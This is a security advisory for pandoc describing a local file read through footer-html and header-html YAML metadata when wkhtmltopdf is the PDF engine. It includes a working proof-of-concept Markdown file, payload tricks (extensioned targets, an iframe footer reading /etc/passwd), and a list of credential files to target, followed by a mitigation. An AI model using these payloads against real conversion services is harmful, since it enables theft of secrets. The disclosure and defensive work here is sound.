# jgm/pandoc: local file read via footer-html/header-html YAML metadata with wkhtmltopdf

**Package**: pandoc
**Ecosystem**: Hackage
**Affected versions**: `>= 2.10` (all versions since `--enable-local-file-access` was added)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` — **6.5**
**CWE**: CWE-73 (External Control of File Name or Path)

## Summary

When pandoc converts a Markdown document to PDF using `--pdf-engine=wkhtmltopdf`,
it passes `footer-html` and `header-html` YAML front matter values verbatim as CLI
arguments to the wkhtmltopdf subprocess. The same invocation hardcodes
`--enable-local-file-access`. An attacker who controls YAML front matter can set
these fields to `file://` URLs, causing wkhtmltopdf to read and render arbitrary
local files into the PDF header or footer.

## Description

`src/Text/Pandoc/PDF.hs` builds the wkhtmltopdf argument list from YAML metadata:

```haskell
-- PDF.hs:191-219
let toArgs (f, mbd) = maybe [] (\d -> ["--" <> f, T.unpack d]) mbd
let args = mathArgs ++ concatMap toArgs
             [ ...
             , ("footer-html", getField "footer-html" meta')  -- line 213
             , ("header-html", getField "header-html" meta')  -- line 214
             ] ++ ("--enable-local-file-access" : pdfargs)    -- line 215
```

`getField` calls `metaToContext` with `stringify`, which converts any `MetaValue`
to its string representation with no URL validation. The `--enable-local-file-access`
flag was added in response to issue #6474 (wkhtmltopdf's default behaviour of
blocking local file access for security broke CSS loading), but it was applied
unconditionally, enabling `file://` access for all arguments including
`footer-html`/`header-html`.

## Payload constraint (verified — this is the key correction)

The naive payload `footer-html: "file:///etc/passwd"` **does not work**. wkhtmltopdf
treats the header/footer URL as an HTML document and appends a query string
(`?page=N&topage=M&...`) when fetching it. For an **extensionless** path like
`/etc/passwd` the appended `?page=N` produces a path wkhtmltopdf fails to resolve, so
nothing is rendered. Two payload shapes that **do** work:

1. **Target a file with an extension** so the `?query` is tolerated as a normal URL
   query on a resolvable resource:

   ```yaml
   footer-html: "file:///home/ci/.config/app/secrets.yaml"
   ```

   (Any readable `*.txt`/`*.yaml`/`*.env`/`*.pem`/`*.json` works; the extension is
   what makes wkhtmltopdf resolve the path with the trailing query.)

2. **Stage a tiny local HTML footer that `<iframe>`s (or `fetch()`es) the target**,
   sidestepping the extension constraint entirely:

   ```yaml
   footer-html: "file:///tmp/footer.html"   # footer.html = <iframe src="file:///etc/passwd"></iframe>
   ```

## Proof of Concept

Create `malicious.md` (extensioned-target variant):

```yaml
---
title: "Invoice"
footer-html: "file:///home/ci/.config/app/secrets.yaml"
header-html: "file:///home/ci/.ssh/known_hosts"
---

Invoice content.
```

Convert:

```bash
pandoc --pdf-engine=wkhtmltopdf -o invoice.pdf malicious.md
```

wkhtmltopdf receives:

```
wkhtmltopdf \
  --footer-html file:///home/ci/.config/app/secrets.yaml \
  --header-html file:///home/ci/.ssh/known_hosts \
  --enable-local-file-access \
  /tmp/pandoc-12345.html \
  invoice.pdf
```

The contents of the targeted file appear in the footer/header of every page of the
generated PDF.

**Verified end-to-end against real wkhtmltopdf:** a unique canary string placed in
the target file was extracted from the rendered PDF text. The argument-injection
anchor (`PDF.hs:213-215`) is exact.

**Argument-interception confirmation** (engine-independent):

```bash
# mock-wkhtmltopdf logs all args to stderr
cat > /usr/local/bin/wkhtmltopdf << 'EOF'
#!/bin/bash
printf 'ARG[%d]=%s\n' $(seq 0 $#) "$@" >&2
EOF
chmod +x /usr/local/bin/wkhtmltopdf

pandoc --pdf-engine=wkhtmltopdf -o /dev/null malicious.md 2>&1 | grep -E 'footer-html|header-html|local-file'
# ARG[N]=--footer-html
# ARG[N+1]=file:///home/ci/.config/app/secrets.yaml
# ARG[N+2]=--header-html
# ARG[N+3]=file:///home/ci/.ssh/known_hosts
# ARG[N+4]=--enable-local-file-access
```

> Note: the mock confirms *argument injection* only. The real file read was verified
> separately with the actual wkhtmltopdf binary using an extensioned target (above) —
> the original draft's `file:///etc/passwd` payload was a false PoC and has been
> replaced.

## Impact

Any file readable by the pandoc process can be exfiltrated into a generated PDF.
Attack surface includes pandoc-as-a-service platforms, documentation pipelines,
and academic paper services that accept Markdown input. The attacker does not need
shell access — only the ability to supply a Markdown document with YAML front matter.

Sensitive targets (with extensions, per the constraint above): `~/.aws/credentials`,
`*.env` files, application config (`*.yaml`/`*.json`), `*.pem` keys, CI secret files.

## Mitigation

Reject `file://` and `data:` schemes before passing values to wkhtmltopdf:

```haskell
let safeHtmlArg v
      | "file://" `T.isPrefixOf` v = Nothing
      | "data:"   `T.isPrefixOf` v = Nothing
      | otherwise                  = Just v
let toArgs (f, mbd) = maybe [] (\d -> ["--" <> f, T.unpack d]) mbd
```

Alternatively, remove the hardcoded `--enable-local-file-access` and document a
supported workaround for the original CSS loading use case.
